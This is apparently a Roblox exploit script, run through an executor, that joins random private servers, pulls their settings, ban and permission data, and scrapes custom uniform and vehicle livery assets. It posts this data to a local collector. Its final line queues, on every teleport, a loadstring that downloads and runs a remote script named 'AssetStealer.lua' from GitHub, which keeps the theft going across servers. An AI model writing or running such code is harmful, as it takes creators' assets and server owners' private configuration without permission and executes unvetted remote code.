local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")

local function isPrivateServer()
    local PrivateServers = ReplicatedStorage:FindFirstChild("PrivateServers")
    if not PrivateServers then return false end

    local Info = PrivateServers:FindFirstChild("Info")
    if not Info then return false end

    local ownerName = Info:FindFirstChild("OwnerName")
    return ownerName and ownerName.Value ~= ""
end

local function safePost(endpoint, body)
    local ok, err = pcall(function()
        request({
            Url = "http://127.0.0.1:5000/" .. endpoint,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(body)
        })
    end)
    if not ok then
        warn("Failed POST to " .. endpoint, err)
    end
end

local function joinRandomServer()
    local PrivateServers = ReplicatedStorage:FindFirstChild("PrivateServers")
    if not PrivateServers then
        warn("PrivateServers not found")
        return false
    end

    local GetServers = PrivateServers:FindFirstChild("GetServers")
    local JoinServer = PrivateServers:FindFirstChild("JoinServer")
    if not GetServers or not JoinServer then
        warn("Missing server remotes")
        return false
    end

    local success, serversResult = pcall(function()
        return GetServers:InvokeServer()
    end)

    if not success or type(serversResult) ~= "table" then
        warn("Failed to get servers")
        return false
    end

    local serverKeys = {}
    for key, _ in pairs(serversResult) do
        table.insert(serverKeys, key)
    end

    if #serverKeys == 0 then
        warn("No servers available")
        return false
    end

    while true do
        local randomKey = serverKeys[math.random(1, #serverKeys)]
        print("Trying server:", randomKey)

        local joinSuccess, joinResult = pcall(function()
            return JoinServer:InvokeServer(randomKey, false, false)
        end)

        if joinSuccess and joinResult == "Queue" then
            print("Queued successfully:", randomKey)
            return true
        else
            warn("Join failed:", joinResult)
            task.wait(1)
        end
    end
end

local function main()
    if not isPrivateServer() then
        warn("Not in a private server, attempting to join one...")
        local joined = joinRandomServer()
        if not joined then
            warn("Could not join any server")
        end
        return
    end

    local PrivateServers = ReplicatedStorage:WaitForChild("PrivateServers")
    local GetSettings = PrivateServers:WaitForChild("GetSettings")

    local success, result = pcall(function()
        return GetSettings:InvokeServer()
    end)
    if not success or not result then
        warn("Failed to get server settings")
        return
    end

    local uniqueKey = result.Data.UniqueKey

    local uniforms = {}
    local UniformsFolder = ReplicatedStorage:WaitForChild("ReplicatedState"):WaitForChild("Uniforms")
    for _, category in ipairs(UniformsFolder:GetChildren()) do
        if category:IsA("Folder") then
            uniforms[category.Name] = {}
            for _, subFolder in ipairs(category:GetChildren()) do
                if subFolder:IsA("Folder") then
                    local items = {}
                    for _, item in ipairs(subFolder:GetChildren()) do
                        if item:IsA("Shirt") then
                            items.Shirt = item.ShirtTemplate
                        elseif item:IsA("Pants") then
                            items.Pants = item.PantsTemplate
                        end
                    end
                    if next(items) then
                        uniforms[category.Name][subFolder.Name] = items
                    end
                end
            end
        end
    end

    safePost("uniforms", {UniqueKey = uniqueKey, data = uniforms, ServerSettings = result.Data})
    safePost("info", {UniqueKey = uniqueKey, Data = result.Data})
    safePost("bans", {UniqueKey = uniqueKey, Data = result.Data})
    safePost("permissions", {UniqueKey = uniqueKey, Data = result.Data})

    local liveries = {}
    local vehiclesFolder = Workspace:WaitForChild("Vehicles")
    for _, vehicle in ipairs(vehiclesFolder:GetChildren()) do
        if vehicle:IsA("Model") then
            local body = vehicle:FindFirstChild("Body")
            if body then
                local vehicleName = vehicle.Name
                local seenSignatures = {}

                for _, colorFolder in ipairs(body:GetChildren()) do
                    if colorFolder.Name == "COLOR" then
                        local decals = {}
                        for _, decal in ipairs(colorFolder:GetChildren()) do
                            if decal:IsA("Decal") and decal.Name:sub(1,12) == "CustomLivery" and decal.Texture ~= "" then
                                decals[decal.Name] = decal.Texture
                            end
                        end

                        if next(decals) then
                            local sigParts = {}
                            for k, v in pairs(decals) do
                                table.insert(sigParts, k .. "=" .. v)
                            end
                            table.sort(sigParts)
                            local signature = table.concat(sigParts, "|")

                            if not seenSignatures[signature] then
                                seenSignatures[signature] = true
                                liveries[vehicleName] = liveries[vehicleName] or {}
                                local liveryKey = "Livery_" .. HttpService:GenerateGUID(false)
                                liveries[vehicleName][liveryKey] = decals
                            end
                        end
                    end
                end
            end
        end
    end

    safePost("liveries", {UniqueKey = uniqueKey, Data = liveries})

    queue_on_teleport([[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/1Sebass2/scripts/refs/heads/main/AssetStealer.lua"))()
    ]])
end

main()
